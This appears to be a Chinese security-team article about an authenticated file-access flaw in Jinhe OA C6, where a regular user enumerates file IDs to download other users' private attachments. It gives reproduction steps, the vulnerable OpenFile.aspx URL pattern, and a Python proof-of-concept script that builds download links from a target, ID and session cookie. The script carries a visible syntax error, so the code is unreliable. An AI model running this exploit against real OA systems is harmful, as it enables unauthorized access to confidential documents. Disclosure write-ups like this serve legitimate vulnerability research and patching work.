> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/9Jv_iZSxCi3T-tYb2FdgmA)

**点击蓝字**

![](https://mmbiz.qpic.cn/mmbiz_gif/4LicHRMXdTzCN26evrT4RsqTLtXuGbdV9oQBNHYEQk7MPDOkic6ARSZ7bt0ysicTvWBjg4MbSDfb28fn5PaiaqUSng/640?wx_fmt=gif)

**关注我们**

  

**_声明  
_**

本文作者：PeiQi  
本文字数：800

阅读时长：5min

附件 / 链接：点击查看原文下载

**本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载**

  

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，狼组安全团队以及文章作者不为此承担任何责任。

狼组安全团队有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经狼组安全团队允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

  

**_前言_**

  

一、

**_漏洞描述_**

金和 OA C6 存在后台越权敏感文件遍历漏洞，普通用户通过遍历特殊参数可以获取其他用户上传的敏感文件

二、

**_漏洞影响_**

金和 OA C6  

三、

**_漏洞复现_**

登录后点击信息交流，发起协同页面

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCcJfxe2zdty9zuqcIUBibicibx7FHwGq3r8M5EtNkCI9vjoARubyqWvxGHHZZXD1Gq1qw7yOUPSicGYw/640?wx_fmt=png)

上传附件并上传发送给目标

这里登录权限为管理员，我们自己发给自己就好，前文只是展现漏洞挖掘思路过程

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCcJfxe2zdty9zuqcIUBibicibjVWrfXlIQAbiaCJPia5qEyMRzHBA7lf5Ex0k7KicT0lwiakcrWnNZm3s2Q/640?wx_fmt=png)

成功收到上传的附件

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCcJfxe2zdty9zuqcIUBibicibBWWystq5plxa58b4iazWnS4B2icgosCywoO4TWRibJP1KE0fUE0qwuasg/640?wx_fmt=png)

点击查看时抓包，发现一个带有文件 ID 的请求包

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCcJfxe2zdty9zuqcIUBibicibWIVTpV1gNQAheSvPzfibT1KUgod5GP8puK2gHo2pOibiayPiaFmhUEkYfg/640?wx_fmt=png)

返回了几个参数

```
var strFilePath = '../Resource/slaves/1/8b473ecb-7b39-4384-ada2-b0ec72c4f6ed.png';
var strFileType = 'png';
var strSid='3jvpvhs410m2wdbbficax5q5';
var strFileIDCode='us9w7xWE7do=';
var strId = '1229';
var strTxtReg = 'txt,ini,xml,config,htm,html,js,css,asp,aspx,jsp,cs,sql,inf,htc,log';
var strImgReg = 'jpg,gif,jpeg,png,ico';
var MD = '';
```

其中我们注意到 strFilePath 为文件的存储地址，我们更改 id 参数为另一个值，且测试后发现 name 文件名参数无关紧要

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCcJfxe2zdty9zuqcIUBibicib5mBKIZolNNwmB9UCtw7uwdkleJIicGy6JIickArHXBFx1zJmVlZLkYzw/640?wx_fmt=png)

改 ID 后发送请求包发现获得另一个文件的信息

访问 Url，注意 **type 参数** 需要为正确的文件后缀才可以访问

```
http://xxx.xxx.xxx.xxx/C6/control/OpenFile.aspx?id=1200&name=&type=pdf
```

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCcJfxe2zdty9zuqcIUBibicibJO59L1KWoMT9cJrictAia0UN5h7IADkmmv4MiaHgTkzycnjZnYFENxpHA/640?wx_fmt=png)

这里更换一个普通用户测试是否可行，尝试遍历 id

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCcJfxe2zdty9zuqcIUBibicibgDkoTXed9CKruMZ41Sts06DGT1FD6cxYa30iakuJQ8RXgIvNDhbbwvg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCcJfxe2zdty9zuqcIUBibicibvPcHib8wB4ibwmh73LDqxobYGFK36etWBNoPV9Vl79brl46RmcOv0mCg/640?wx_fmt=png)

存在 **strFilePath 参数** 则是存在文件，为空则是文件已经不存在

同时抓包下载文件页面也可以看到可获取的参数

**FileID 与 FileIDCode**

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCcJfxe2zdty9zuqcIUBibicibrcy8gr2ialmBcmxlAJetV8JFicZOb0EYQr7JToYAT3Uf0v2NcVqcNicIQ/640?wx_fmt=png)

于是只需要通过刚刚的 ID 遍历，获取两个关键参数就能下载其他人发送的敏感文件，且只需要普通用户权限

四、

**_漏洞 POC_**

```
POC只检测是否存在漏洞，且漏洞存在于后台需要登录
运行后访问链接即可下载文件
```

```
import requests
import sys
import random
import re
import base64
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: 金和OA C6                                                  \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url, file_id, cookie):
    vuln_url = target_url + "/C6/control/OpenFile.aspx?id={}&.format(file_id)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie":cookie
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在请求 Url: {}\033[0m".format(vuln_url))
        if "strFilePath =" in response.text and response.status_code == 200:
            strFilePath = re.findall(r"var strFilePath = '(.*?)';", response.text)[0]
            strFileType = strFilePath[-3:]
            strFileIDCode = re.findall(r"var strFileIDCode='(.*?)';", response.text)[0]
            strId = re.findall(r"var strId = '(.*?)';", response.text)[0]
            sid = re.findall(r'ASP.NET_SessionId=(.*?);', cookie)[0]
            if strFilePath != "":
                print("\033[36m[o] 目标 {} 存在漏洞, 获取文件信息:\n[o] 文件路径：{}\n[o] 文件类型：{}\n[o] 文件ID code：{}\n[o] 文件编号：{}\033[0m".format(target_url, strFilePath, strFileType,strFileIDCode, strId ))
                print("\033[32m[o] 文件下载链接为: {}/C6/JHSoft.Web.CustomQuery/uploadFileDownLoad.aspx?Decrypt=&FileID={}&FileIDCode={}&sid={}".format(target_url, strId, strFileIDCode, sid))
            else:
                print("\033[31m[x] 目标 {} 文件不存在     \033[0m".format(target_url))
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞     \033[0m".format(target_url))

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    file_id = str(input("\033[35mFile_id >>> \033[0m"))
    cookie = str(input("\033[35mCookie  >>> \033[0m"))
    POC_1(target_url, file_id, cookie)
```

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCcJfxe2zdty9zuqcIUBibicibLAV2Z7DssubXxoLCTQr9iaHyYLBQhbCqjtVwa1CCctl1cjWvH6jvVWg/640?wx_fmt=png)

  

**_作者_**

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzDCc55WbFiasXQV2ZDzFo8NclAZ2LicCiaeLqxOD3AticSzDm7rRACia7M9m4pickkG8pXR2w1L8maEoBSw/640?wx_fmt=png)

推荐一下 PeiQi 的个人公众号~

公众号

  

**_扫描关注公众号回复加群_**

**_和师傅们一起讨论研究~_**

  

**长**

**按**

**关**

**注**

**WgpSec 狼组安全团队**

微信号：wgpsec

Twitter：@wgpsec

![](https://mmbiz.qpic.cn/mmbiz_jpg/4LicHRMXdTzBhAsD8IU7jiccdSHt39PeyFafMeibktnt9icyS2D2fQrTSS7wdMicbrVlkqfmic6z6cCTlZVRyDicLTrqg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_gif/gdsKIbdQtWAicUIic1QVWzsMLB46NuRg1fbH0q4M7iam8o1oibXgDBNCpwDAmS3ibvRpRIVhHEJRmiaPS5KvACNB5WgQ/640?wx_fmt=gif)